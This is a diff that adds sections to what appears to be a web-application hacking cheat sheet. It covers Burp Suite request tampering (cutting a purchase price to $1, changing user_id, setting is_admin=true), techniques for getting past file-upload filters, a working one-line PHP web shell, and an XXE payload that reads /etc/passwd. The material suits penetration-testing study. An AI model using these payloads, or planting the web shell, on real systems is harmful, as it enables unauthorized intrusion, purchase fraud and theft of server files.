@@ -270,6 +270,168 @@ Modified: http://site.com/purchase.php?item=shirt&price=1
 
 ---
 
+## 3.3.1 Burp Suite — Proxy Interception & Modification
+
+### Setup & Enable Proxy
+
+```
+1. Open Burp Suite
+2. Proxy tab → Intercept is on (button shows blue)
+3. Configure browser proxy:
+   - Firefox: Settings → Network → Manual proxy
+   - HTTP Proxy: 127.0.0.1, Port: 8080
+4. Open target URL in browser
+5. Request pauses in Burp's Intercept tab
+```
+
+### Intercept & Modify Request
+
+```
+1. Browse to target site normally
+2. Click button/submit form
+3. Request pauses in Burp → Intercept tab
+4. Edit request (change price, user ID, parameters)
+5. Click Forward button
+6. Server receives modified request
+```
+
+### Example: Price Modification
+
+```
+Original request:
+POST /purchase HTTP/1.1
+price=100&item=phone
+
+Modified in Burp:
+price=1&item=phone
+(Change 100 to 1, then Forward)
+
+Result: Charged $1 instead of $100
+```
+
+### Common Tampering Targets
+
+```
+Interceptable parameters:
+- price=100          → Change to price=0.01
+- user_id=5          → Change to user_id=1 (admin)
+- discount=0         → Change to discount=99
+- is_admin=false     → Change to is_admin=true
+- auth_token=xxx     → Replay from another user
+```
+
+### Repeater Tab (Craft Custom Requests)
+
+```
+1. Right-click request in Intercept → Send to Repeater
+2. Repeater tab opens
+3. Modify request manually
+4. Click Send button
+5. Observe response
+6. Repeat with different payloads
+```
+
+---
+
+## 3.3.2 File Upload Bypass Techniques
+
+### Common File Upload Vulnerabilities
+
+Servers check uploaded files (usually to prevent malicious executables). But checks are often bypassable.
+
+### Bypass 1: Extension Manipulation
+
+```
+Goal: Upload PHP shell, server accepts only .jpg
+
+Techniques:
+.php.jpg         → Server reads left-to-right, processes .php part
+.php%20          → %20 is URL-encoded space, browser strips it
+.php%00.jpg      → %00 is null byte, terminates filename at .jpg (older PHP)
+.phtml           → Alternative PHP extension, often allowed
+.php3/.php4      → Other PHP-executable extensions
+.php~            → Backup file, sometimes executable
+.phtml           → PHP HTML variant
+```
+
+### Bypass 2: Magic Bytes Evasion
+
+Server checks file header (first bytes) instead of extension.
+
+```
+Expected: JPEG starts with FF D8 FF
+Trick: Add JPEG header to PHP shell
+
+#include <stdio.h>
+unsigned char jpeg[] = {0xFF, 0xD8, 0xFF};
+FILE *f = fopen("shell.jpg", "wb");
+fwrite(jpeg, sizeof(jpeg), 1, f);
+fwrite(php_payload, strlen(php_payload), 1, f);
+
+Result: File is valid JPEG + executable PHP
+```
+
+### Bypass 3: MIME Type Manipulation
+
+```
+Original request:
+POST /upload HTTP/1.1
+Content-Type: application/x-php
+[PHP shell bytes]
+
+Modified (trick server):
+POST /upload HTTP/1.1
+Content-Type: image/jpeg
+[PHP shell bytes]
+
+Server checks MIME type header, not actual content
+```
+
+### Bypass 4: Double Extension
+
+```
+shell.php.jpg       → Server strips .jpg, processes .php
+shell.jpg.php       → Different order, may confuse parser
+shell.php.txt       → Whitelist .txt, but .php processed first
+```
+
+### Bypass 5: Case Variation
+
+```
+shell.PhP           → Case variation, parser confusion
+shell.pHp
+shell.PHP
+```
+
+### Bypass 6: Null Byte Injection (Legacy)
+
+```
+shell.php%00.jpg    → %00 terminates string, becomes shell.php
+                      (Works in older PHP/Apache, patched now)
+```
+
+### Example: PHP Web Shell
+
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+
+Upload as `shell.php.jpg` or `shell.jpg` with JPEG header + PHP code.
+
+### XXE (XML External Entity) Injection
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+```
+
+If server parses XML without disabling external entities, reads files.
+
+---
+
 ## 3.4 WordPress Scanning
 
 ### What It Does
